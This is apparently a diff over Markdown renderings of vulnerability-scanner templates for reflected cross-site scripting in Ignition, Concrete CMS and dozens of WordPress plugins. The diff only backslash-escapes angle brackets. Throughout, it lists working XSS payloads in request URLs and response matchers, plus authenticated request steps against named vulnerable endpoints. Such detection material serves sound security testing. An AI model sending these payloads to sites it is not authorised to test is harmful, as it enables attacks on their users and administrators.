@@ -14,13 +14,13 @@
 ## Requests
 - Method - GET
 ### URL
-- {{BaseURL}}/_ignition/scripts/--><svg%20onload=alert(document.domain)>
+- {{BaseURL}}/_ignition/scripts/-->\<svg%20onload=alert(document.domain)>
 ### Matchers
 
 **Type - word**
 - part - body
 - words
-    1. Undefined index: --><svg onload=alert(document.domain)> in file
+    1. Undefined index: -->\<svg onload=alert(document.domain)> in file
 
 **Type - word**
 - part - header
@@ -46,7 +46,7 @@
 **Type - regex**
 - part - body
 - regex
-    1. ^<script>alert\(document.domain\)</script>$
+    1. ^\<script>alert\(document.domain\)\</script>$
 
 **Type - word**
 - part - header
@@ -58,7 +58,7 @@
     1. 200
 
 ---
-# Concrete CMS <8.5.2 - Cross-Site Scripting
+# Concrete CMS \<8.5.2 - Cross-Site Scripting
 ## Description
 - Concrete CMS before 8.5.2 contains a cross-site scripting vulnerability in preview_as_user function using cID parameter.
 - severity - high
@@ -66,13 +66,13 @@
 ## Requests
 - Method - GET
 ### URL
-- {{BaseURL}}/ccm/system/panels/page/preview_as_user/preview?cID="></iframe><svg/onload=alert("{{randstr}}")>
+- {{BaseURL}}/ccm/system/panels/page/preview_as_user/preview?cID=">\</iframe>\<svg/onload=alert("{{randstr}}")>
 ### Matchers
 
 **Type - word**
 - part - body
 - words
-    1. </iframe><svg/onload=alert("{{randstr}}")>
+    1. \</iframe>\<svg/onload=alert("{{randstr}}")>
 
 **Type - word**
 - part - header
@@ -99,7 +99,7 @@
 
 **Type - word**
 - words
-    1. <svg/onload=alert('{{randstr}}')>
+    1. \<svg/onload=alert('{{randstr}}')>
 - part - body
 
 **Type - status**
@@ -125,7 +125,7 @@
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -137,7 +137,7 @@
     1. 200
 
 ---
-# WordPress WPify Woo Czech <3.5.7 - Cross-Site Scripting
+# WordPress WPify Woo Czech \<3.5.7 - Cross-Site Scripting
 ## Description
 - WordPress WPify Woo Czech plugin before 3.5.7 contains a cross-site scripting vulnerability. The plugin uses the Vies library 2.2.0, which has a sample file outputting $_SERVER['PHP_SELF'] in an attribute without being escaped first. The issue is only exploitable when the web server has the PDO driver installed and write access to the example directory.
 - severity - high
@@ -145,13 +145,13 @@
 ## Requests
 - Method - GET
 ### URL
-- {{BaseURL}}/wp-content/plugins/wpify-woo/deps/dragonbe/vies/examples/async_processing/queue.php/"><script>alert(document.domain)</script>
+- {{BaseURL}}/wp-content/plugins/wpify-woo/deps/dragonbe/vies/examples/async_processing/queue.php/">\<script>alert(document.domain)\</script>
 ### Matchers
 
 **Type - word**
 - part - body
 - words
-    1. "><script>alert(document.domain)</script>
+    1. ">\<script>alert(document.domain)\</script>
     2. Add a new VAT ID to the queue
 - condition - and
 
@@ -180,7 +180,7 @@
 **Type - word**
 - part - body
 - words
-    1. value="FB_appId"><script>alert(document.domain)</script>"
+    1. value="FB_appId">\<script>alert(document.domain)\</script>"
 
 **Type - word**
 - words
@@ -192,7 +192,7 @@
     1. 200
 
 ---
-# WordPress Ambience Theme <=1.0 - Cross-Site Scripting
+# WordPress Ambience Theme \<=1.0 - Cross-Site Scripting
 ## Description
 - WordPress Ambience Theme 1.0 and earlier was affected by a cross-site scripting vulnerability.
 
@@ -207,7 +207,7 @@
 **Type - word**
 - part - body
 - words
-    1. <body onload=alert(1)>
+    1. \<body onload=alert(1)>
 
 **Type - word**
 - part - header
@@ -219,7 +219,7 @@
     1. 200
 
 ---
-# WordPress Woody Code Snippets <2.4.6 - Cross-Site Scripting
+# WordPress Woody Code Snippets \<2.4.6 - Cross-Site Scripting
 ## Description
 - WordPress Woody Code Snippets plugin before 2.4.6 contains a cross-site scripting vulnerability. It does not escape generated URLs before outputting them back in an attribute.
 - severity - high
@@ -238,7 +238,7 @@ log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
 ```
 ### Step - 2
 ```
-GET /wp-admin/edit.php?post_type=wbcr-snippets&page=import-wbcr_insert_php&a"><script>alert(1)</script> HTTP/1.1
+GET /wp-admin/edit.php?post_type=wbcr-snippets&page=import-wbcr_insert_php&a">\<script>alert(1)\</script> HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -247,7 +247,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. import-wbcr_insert_php&a\"><script>alert(1)</script>"
+    1. import-wbcr_insert_php&a\">\<script>alert(1)\</script>"
     2. Woody Code Snippets Import
 - condition - and
 
@@ -261,7 +261,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# WordPress Clearfy Cache <2.0.5 - Cross-Site Scripting
+# WordPress Clearfy Cache \<2.0.5 - Cross-Site Scripting
 ## Description
 - WordPress Clearfy Cache 2.0.5 does not escape some URLs before outputting them back in attributes, leading to reflected cross-site scripting.
 - severity - medium
@@ -280,7 +280,7 @@ log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
 ```
 ### Step - 2
 ```
-GET /wp-admin/admin.php?page=gonzales-wbcr_clearfy&action=index&wbcr_assets_manager=1&a"><script>alert(1)</script> HTTP/1.1
+GET /wp-admin/admin.php?page=gonzales-wbcr_clearfy&action=index&wbcr_assets_manager=1&a">\<script>alert(1)\</script> HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -289,7 +289,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. "><script>alert(1)</script>
+    1. ">\<script>alert(1)\</script>
     2. Webcraftic Clearfy - WordPress optimization plugin
 - condition - and
 
@@ -316,7 +316,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. <script>alert(document.domain)</script>
+    1. \<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -329,7 +329,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# WordPress Flow-Flow Social Stream <=3.0.71 - Cross-Site Scripting
+# WordPress Flow-Flow Social Stream \<=3.0.71 - Cross-Site Scripting
 ## Description
 - WordPress Flow-Flow Social Stream 3.0.7.1 and prior is vulnerable to cross-site scripting.
 - severity - medium
@@ -343,7 +343,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. "hash":"<img src=x onerror=alert(document.domain)>"
+    1. "hash":"\<img src=x onerror=alert(document.domain)>"
     2. "errors"
 - condition - and
 
@@ -357,7 +357,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# WordPress Checkout Fields Manager for WooCommerce <5.5.7 - Cross-Site Scripting
+# WordPress Checkout Fields Manager for WooCommerce \<5.5.7 - Cross-Site Scripting
 ## Description
 - WordPress Checkout Fields Manager for WooCommerce 5.5.7 does not escape some URLs before outputting them back in attributes, leading to reflected cross-site scripting.
 - severity - medium
@@ -376,7 +376,7 @@ log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
 ```
 ### Step - 2
 ```
-GET /wp-admin/admin.php?page=wc-settings&tab=wooccm&section=advanced&">--><script>alert(1)</script> HTTP/1.1
+GET /wp-admin/admin.php?page=wc-settings&tab=wooccm&section=advanced&">-->\<script>alert(1)\</script> HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -385,7 +385,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. >--><script>alert(1)</script>&action=wooccm_nuke_options&
+    1. >-->\<script>alert(1)\</script>&action=wooccm_nuke_options&
 
 **Type - word**
 - part - header
@@ -397,7 +397,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# WordPress ShortPixel Image Optimizer <4.22.10 - Cross-Site Scripting
+# WordPress ShortPixel Image Optimizer \<4.22.10 - Cross-Site Scripting
 ## Description
 - WordPress ShortPixel Image Optimizer 4.22.10 does not escape generated URLs before outputting them back in an attribute, leading to reflected cross-site scripting.
 - severity - medium
@@ -416,7 +416,7 @@ log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
 ```
 ### Step - 2
 ```
-GET /wp-admin/options-general.php?page=wp-shortpixel-settings&"><script>alert(1)</script> HTTP/1.1
+GET /wp-admin/options-general.php?page=wp-shortpixel-settings&">\<script>alert(1)\</script> HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -425,7 +425,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. &\"><script>alert(1)</script>&noheader=true&sp-action
+    1. &\">\<script>alert(1)\</script>&noheader=true&sp-action
 
 **Type - word**
 - part - header
@@ -450,7 +450,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -476,7 +476,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -489,9 +489,9 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# WordPress WooCommerce Google Shopping < 1.2.4 - Cross-Site Scripting
+# WordPress WooCommerce Google Shopping \< 1.2.4 - Cross-Site Scripting
 ## Description
-- WordPress WooCommerce Google Shopping < 1.2.4 is susceptible to cross-site scripting because the plugin does not sanitize or escape the search GET parameter before outputting it back in the page and executing it in a logged in admin context.
+- WordPress WooCommerce Google Shopping \< 1.2.4 is susceptible to cross-site scripting because the plugin does not sanitize or escape the search GET parameter before outputting it back in the page and executing it in a logged in admin context.
 - severity - high
 - tags - wp-plugin,xss,authenticated,woocommerce,wpscan,wordpress
 ## Requests
@@ -517,7 +517,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -529,7 +529,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# WordPress Members List <4.3.7 - Cross-Site Scripting
+# WordPress Members List \<4.3.7 - Cross-Site Scripting
 ## Description
 - WordPress Members List 4.3.7 does not sanitize and escape some parameters in various pages before outputting them back, leading to reflected cross-site scripting vulnerabilities.
 - severity - medium
@@ -543,7 +543,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. "><img src onerror=alert(document.domain) x
+    1. ">\<img src onerror=alert(document.domain) x
     2. wrap tern-wrap
 - condition - and
 
@@ -570,7 +570,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -596,7 +596,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -622,7 +622,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -650,7 +650,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -662,9 +662,9 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# WordPress My Chatbot <= 1.1 - Cross-Site Scripting
+# WordPress My Chatbot \<= 1.1 - Cross-Site Scripting
 ## Description
-- WordPress My Chatbot <= 1.1  is susceptible to cross-site scripting. The plugin does not sanitize or escape its tab parameter in the Settings page before outputting it back in an attribute.
+- WordPress My Chatbot \<= 1.1  is susceptible to cross-site scripting. The plugin does not sanitize or escape its tab parameter in the Settings page before outputting it back in an attribute.
 - severity - high
 - tags - wordpress,wp-plugin,xss,authenticated,wpscan
 ## Requests
@@ -690,7 +690,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -702,7 +702,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# WordPress 404 to 301 Log Manager <3.1.2 - Cross-Site Scripting
+# WordPress 404 to 301 Log Manager \<3.1.2 - Cross-Site Scripting
 ## Description
 - WordPress 404 to 301 Log Manager 3.1.2 does not escape some URLs before outputting them back in attributes, leading to reflected cross-site scripting.
 - severity - medium
@@ -721,7 +721,7 @@ log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
 ```
 ### Step - 2
 ```
-GET /wp-admin/admin.php?page=jj4t3-logs&a"><script>alert(1)</script> HTTP/1.1
+GET /wp-admin/admin.php?page=jj4t3-logs&a">\<script>alert(1)\</script> HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -730,7 +730,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. "><script>alert(1)</script>
+    1. ">\<script>alert(1)\</script>
     2. 404 Error Logs
 - condition - and
 
@@ -744,7 +744,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# WordPress All Export <1.3.6 - Cross-Site Scripting
+# WordPress All Export \<1.3.6 - Cross-Site Scripting
 ## Description
 - WordPress All Export plugin before version 1.3.6 does not escape some URLs before outputting them back in attributes, leading to reflected cross-site scripting.
 - severity - medium
@@ -763,7 +763,7 @@ log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
 ```
 ### Step - 2
 ```
-GET /wp-admin/admin.php?page=pmxe-admin-manage&a"><script>alert(1)</script> HTTP/1.1
+GET /wp-admin/admin.php?page=pmxe-admin-manage&a">\<script>alert(1)\</script> HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -772,7 +772,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. manage&a\"><script>alert(1)</script>">
+    1. manage&a\">\<script>alert(1)\</script>">
     2. Manage Exports
 - condition - and
 
@@ -805,7 +805,7 @@ log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
 ```
 ### Step - 2
 ```
-GET /wp-admin/admin.php?page=snippets&tag=</script><script>alert(document.domain)</script> HTTP/1.1
+GET /wp-admin/admin.php?page=snippets&tag=\</script>\<script>alert(document.domain)\</script> HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -814,7 +814,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
     2. toplevel_page_snippets
     3. Search results in tag
 - condition - and
@@ -829,7 +829,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# WordPress SEO Redirection <7.4 - Cross-Site Scripting
+# WordPress SEO Redirection \<7.4 - Cross-Site Scripting
 ## Description
 - WordPress SEO Redirection 7.4 does not escape the tab parameter before outputting it back in JavaScript code, leading to a reflected cross-site scripting vulnerability.
 
@@ -868,7 +868,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. </script><svg/onload=alert(/XSS/)>
+    1. \</script>\<svg/onload=alert(/XSS/)>
     2. settings_page_seo-redirection
 - condition - and
 
@@ -882,9 +882,9 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# WordPress Adaptive Images < 0.6.69 - Cross-Site Scripting
+# WordPress Adaptive Images \< 0.6.69 - Cross-Site Scripting
 ## Description
-- WordPress Adaptive Images < 0.6.69 is susceptible to cross-site scripting because the plugin does not sanitize and escape the REQUEST_URI before outputting it back in a page.
+- WordPress Adaptive Images \< 0.6.69 is susceptible to cross-site scripting because the plugin does not sanitize and escape the REQUEST_URI before outputting it back in a page.
 - severity - high
 - tags - wpscan,wordpress,xss,wp-plugin,wp
 ## Requests
@@ -895,8 +895,8 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. <img/src/onerror=alert(document.domain)>
-    2. <td>Image</td>
+    1. \<img/src/onerror=alert(document.domain)>
+    2. \<td>Image\</td>
 - condition - and
 
 **Type - word**
@@ -909,7 +909,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# WordPress Age Gate <2.20.4 - Cross-Site Scripting
+# WordPress Age Gate \<2.20.4 - Cross-Site Scripting
 ## Description
 - WordPress Age Gate plugin before 2.20.4 contains a cross-site scripting vulnerability. The plugin does not escape some URLs before outputting them back in attributes.
 
@@ -936,7 +936,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. "><script>alert(document.domain)</script>
+    1. ">\<script>alert(document.domain)\</script>
     2. Age Gate Restriction Settings
 - condition - and
 
@@ -950,7 +950,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# Analytify <4.2.1 - Cross-Site Scripting
+# Analytify \<4.2.1 - Cross-Site Scripting
 ## Description
 - WordPress Analytify 4.2.1 does not escape the current URL before outputting it back in a 404 page when the 404 tracking feature is enabled, leading to reflected cross-site scripting.
 
@@ -959,13 +959,13 @@ Host: {{Hostname}}
 ## Requests
 - Method - GET
 ### URL
-- {{BaseURL}}/aa404bb?a</script><script>alert(/XSS/)</script>
+- {{BaseURL}}/aa404bb?a\</script>\<script>alert(/XSS/)\</script>
 ### Matchers
 
 **Type - word**
 - part - body
 - words
-    1. text/javascript">alert(/XSS/)</script>
+    1. text/javascript">alert(/XSS/)\</script>
     2. wp-analytify
 - condition - and
 
@@ -979,7 +979,7 @@ Host: {{Hostname}}
     1. 404
 
 ---
-# WordPress CURCY - Multi Currency for WooCommerce <2.1.18 - Cross-Site Scripting
+# WordPress CURCY - Multi Currency for WooCommerce \<2.1.18 - Cross-Site Scripting
 ## Description
 - WordPress CURCY - Multi Currency for WooCommerce 2.1.18 does not escape some generated URLs before outputting them back in attributes, leading to reflected cross-site scripting.
 - severity - medium
@@ -998,7 +998,7 @@ log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
 ```
 ### Step - 2
 ```
-GET /wp-admin/admin.php?page=wc-reports&a"><script>alert(1)</script> HTTP/1.1
+GET /wp-admin/admin.php?page=wc-reports&a">\<script>alert(1)\</script> HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -1007,7 +1007,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. wc-reports&a\"><script>alert(1)</script>">All
+    1. wc-reports&a\">\<script>alert(1)\</script>">All
 
 **Type - word**
 - part - header
@@ -1019,7 +1019,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# WPtouch < 4.3.44 - Cross Site Scripting
+# WPtouch \< 4.3.44 - Cross Site Scripting
 ## Description
 - The plugin does not escape some URLs before outputting them back in attributes, leading to Reflected Cross-Site Scripting.
 
@@ -1046,7 +1046,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. "><script>alert(document.domain)</script>
+    1. ">\<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - body
@@ -1066,7 +1066,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# Sassy Social Share <=3.3.3 - Cross-Site Scripting
+# Sassy Social Share \<=3.3.3 - Cross-Site Scripting
 ## Description
 - WordPress Sassy Social Share 3.3.3 and prior is vulnerable to cross-site scripting because certain AJAX endpoints return JSON data with no Content-Type header set and then use the default text/html. In other words, any JSON that has HTML will be rendered as such.
 
@@ -1081,7 +1081,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. [{"<img src=x onerror=alert(document.domain)>":""}]
+    1. [{"\<img src=x onerror=alert(document.domain)>":""}]
     2. facebook
     3. twitter
 - condition - and
@@ -1097,7 +1097,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# WordPress Modula Image Gallery <2.6.7 - Cross-Site Scripting
+# WordPress Modula Image Gallery \<2.6.7 - Cross-Site Scripting
 ## Description
 - WordPress Modula Image Gallery 2.6.7 does not escape some URLs before outputting them back in attributes, leading to reflected cross-site scripting.
 - severity - medium
@@ -1116,7 +1116,7 @@ log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
 ```
 ### Step - 2
 ```
-GET /wp-admin/edit.php?post_type=modula-gallery&page=modula-addons&a"><script>alert(1)</script> HTTP/1.1
+GET /wp-admin/edit.php?post_type=modula-gallery&page=modula-addons&a">\<script>alert(1)\</script> HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -1125,7 +1125,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. &a\"><script>alert(1)</script>&extensions=
+    1. &a\">\<script>alert(1)\</script>&extensions=
 
 **Type - word**
 - part - header
@@ -1137,7 +1137,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# WordPress New User Approve <2.4.1 - Cross-Site Scripting
+# WordPress New User Approve \<2.4.1 - Cross-Site Scripting
 ## Description
 - WordPress New User Approve 2.4.1 does not escape some URLs before outputting them back in attributes, leading to reflected cross-site scripting.
 - severity - medium
@@ -1165,7 +1165,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. ?a"><script>alert(1)</script>&new-user-approve-settings
+    1. ?a">\<script>alert(1)\</script>&new-user-approve-settings
 
 **Type - word**
 - part - header
@@ -1192,7 +1192,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. Got: <script>alert(document.domain)</script><br>
+    1. Got: \<script>alert(document.domain)\</script>\<br>
 
 **Type - word**
 - part - header
@@ -1217,7 +1217,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. '>"<svg/onload=confirm('test')>
+    1. '>"\<svg/onload=confirm('test')>
 - part - body
 
 **Type - word**
@@ -1245,7 +1245,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. ath_upload_calameo_publication(id\"><script>alert(document.domain)</script>&)
+    1. ath_upload_calameo_publication(id\">\<script>alert(document.domain)\</script>&)
 
 **Type - word**
 - part - header
@@ -1257,7 +1257,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# Zebra_Form PHP Library <= 2.9.8 - Cross-Site Scripting
+# Zebra_Form PHP Library \<= 2.9.8 - Cross-Site Scripting
 ## Description
 - Zebra_Form PHP library 2.9.8 and prior (which is used by some WordPress plugins) is affected by reflected cross-site scripting vulnerabilities via process.php.
 
@@ -1284,7 +1284,7 @@ Test
 **Type - word**
 - part - body
 - words
-    1. </script><img src onerror=alert(document.domain)>
+    1. \</script>\<img src onerror=alert(document.domain)>
 
 **Type - word**
 - part - header
@@ -1309,7 +1309,7 @@ Test
 
 **Type - word**
 - words
-    1. <script>alert(1)</script>
+    1. \<script>alert(1)\</script>
 - part - body
 
 **Type - word**
@@ -1335,7 +1335,7 @@ Test
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -1348,7 +1348,7 @@ Test
     1. 200
 
 ---
-# WordPress WooCommerce PDF Invoices & Packing Slips <2.15.0 - Cross-Site Scripting
+# WordPress WooCommerce PDF Invoices & Packing Slips \<2.15.0 - Cross-Site Scripting
 ## Description
 - WordPress WooCommerce PDF Invoices & Packing Slips 2.15.0 does not escape some URLs before outputting them in attributes, leading to reflected cross-site scripting.
 - severity - medium
@@ -1367,7 +1367,7 @@ log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
 ```
 ### Step - 2
 ```
-GET /wp-admin/admin.php?page=wpo_wcpdf_options_page&tab=documents&section=invoice&"><script>alert(document.domain)</script> HTTP/1.1
+GET /wp-admin/admin.php?page=wpo_wcpdf_options_page&tab=documents&section=invoice&">\<script>alert(document.domain)\</script> HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -1376,7 +1376,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. ><script>alert(document.domain)</script>
+    1. >\<script>alert(document.domain)\</script>
     2. WooCommerce PDF Invoices
 - condition - and
 
@@ -1403,7 +1403,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -1451,7 +1451,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. /tmp/www/<script>alert(document.domain)</script>
+    1. /tmp/www/\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - status**
@@ -1503,7 +1503,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. location='../../</script><script>alert(document.domain)</script>
+    1. location='../../\</script>\<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -1529,7 +1529,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. LGD_OID = <script>alert(document.domain)</script>
+    1. LGD_OID = \<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -1555,7 +1555,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. header\"><script>alert(document.domain)</script>.css?
+    1. header\">\<script>alert(document.domain)\</script>.css?
 
 **Type - word**
 - part - header
@@ -1575,13 +1575,13 @@ Host: {{Hostname}}
 ## Requests
 - Method - GET
 ### URL
-- {{BaseURL}}/plugin/sms5/ajax.sms_emoticon.php?arr_ajax_msg=gnuboard<svg+onload=alert(document.domain)>
+- {{BaseURL}}/plugin/sms5/ajax.sms_emoticon.php?arr_ajax_msg=gnuboard\<svg+onload=alert(document.domain)>
 ### Matchers
 
 **Type - word**
 - part - body
 - words
-    1. "0nuboard<svg onload=alert(document.domain)>"
+    1. "0nuboard\<svg onload=alert(document.domain)>"
 
 **Type - word**
 - part - header
@@ -1610,7 +1610,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. <script>alert(document.cookie)</script>
+    1. \<script>alert(document.cookie)\</script>
 - part - body
 
 **Type - word**
@@ -1636,44 +1636,44 @@ Host: {{Hostname}}
 - part - body
 - condition - or
 - words
-    1. '>"<svg/onload=confirm('q')>
-    2. '>"<svg/onload=confirm('s')>
-    3. '>"<svg/onload=confirm('search')>
-    4. '>"<svg/onload=confirm('id')>
-    5. '>"<svg/onload=confirm('action')>
-    6. '>"<svg/onload=confirm('keyword')>
-    7. '>"<svg/onload=confirm('query')>
-    8. '>"<svg/onload=confirm('page')>
-    9. '>"<svg/onload=confirm('keywords')>
-    10. '>"<svg/onload=confirm('url')>
-    11. '>"<svg/onload=confirm('view')>
-    12. '>"<svg/onload=confirm('cat')>
-    13. '>"<svg/onload=confirm('name')>
-    14. '>"<svg/onload=confirm('key')>
-    15. '>"<svg/onload=confirm('p')>
-    16. '>"<svg/onload=confirm('month')>
-    17. '>"<svg/onload=confirm('page_id')>
-    18. '>"<svg/onload=confirm('password')>
-    19. '>"<svg/onload=confirm('terms')>
-    20. '>"<svg/onload=confirm('token')>
-    21. '>"<svg/onload=confirm('type')>
-    22. '>"<svg/onload=confirm('unsubscribe_token')>
-    23. '>"<svg/onload=confirm('api')>
-    24. '>"<svg/onload=confirm('api_key')>
-    25. '>"<svg/onload=confirm('begindate')>
-    26. '>"<svg/onload=confirm('callback')>
-    27. '>"<svg/onload=confirm('categoryid')>
-    28. '>"<svg/onload=confirm('csrf_token')>
-    29. '>"<svg/onload=confirm('email')>
-    30. '>"<svg/onload=confirm('emailto')>
-    31. '>"<svg/onload=confirm('enddate')>
-    32. '>"<svg/onload=confirm('immagine')>
-    33. '>"<svg/onload=confirm('item')>
-    34. '>"<svg/onload=confirm('jsonp')>
-    35. '>"<svg/onload=confirm('l')>
-    36. '>"<svg/onload=confirm('lang')>
-    37. '>"<svg/onload=confirm('list_type')>
-    38. '>"<svg/onload=confirm('year')>
+    1. '>"\<svg/onload=confirm('q')>
+    2. '>"\<svg/onload=confirm('s')>
+    3. '>"\<svg/onload=confirm('search')>
+    4. '>"\<svg/onload=confirm('id')>
+    5. '>"\<svg/onload=confirm('action')>
+    6. '>"\<svg/onload=confirm('keyword')>
+    7. '>"\<svg/onload=confirm('query')>
+    8. '>"\<svg/onload=confirm('page')>
+    9. '>"\<svg/onload=confirm('keywords')>
+    10. '>"\<svg/onload=confirm('url')>
+    11. '>"\<svg/onload=confirm('view')>
+    12. '>"\<svg/onload=confirm('cat')>
+    13. '>"\<svg/onload=confirm('name')>
+    14. '>"\<svg/onload=confirm('key')>
+    15. '>"\<svg/onload=confirm('p')>
+    16. '>"\<svg/onload=confirm('month')>
+    17. '>"\<svg/onload=confirm('page_id')>
+    18. '>"\<svg/onload=confirm('password')>
+    19. '>"\<svg/onload=confirm('terms')>
+    20. '>"\<svg/onload=confirm('token')>
+    21. '>"\<svg/onload=confirm('type')>
+    22. '>"\<svg/onload=confirm('unsubscribe_token')>
+    23. '>"\<svg/onload=confirm('api')>
+    24. '>"\<svg/onload=confirm('api_key')>
+    25. '>"\<svg/onload=confirm('begindate')>
+    26. '>"\<svg/onload=confirm('callback')>
+    27. '>"\<svg/onload=confirm('categoryid')>
+    28. '>"\<svg/onload=confirm('csrf_token')>
+    29. '>"\<svg/onload=confirm('email')>
+    30. '>"\<svg/onload=confirm('emailto')>
+    31. '>"\<svg/onload=confirm('enddate')>
+    32. '>"\<svg/onload=confirm('immagine')>
+    33. '>"\<svg/onload=confirm('item')>
+    34. '>"\<svg/onload=confirm('jsonp')>
+    35. '>"\<svg/onload=confirm('l')>
+    36. '>"\<svg/onload=confirm('lang')>
+    37. '>"\<svg/onload=confirm('list_type')>
+    38. '>"\<svg/onload=confirm('year')>
 
 **Type - word**
 - part - header
@@ -1685,7 +1685,7 @@ Host: {{Hostname}}
 - condition - or
 - negative - True
 - words
-    1. <title>Access Denied</title>
+    1. \<title>Access Denied\</title>
     2. You don't have permission to access
 
 **Type - status**
@@ -1706,7 +1706,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. "><injectable>
+    1. ">\<injectable>
 - part - body
 
 **Type - word**
@@ -1734,7 +1734,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. <div><script>alert(document.domain)</script></div>
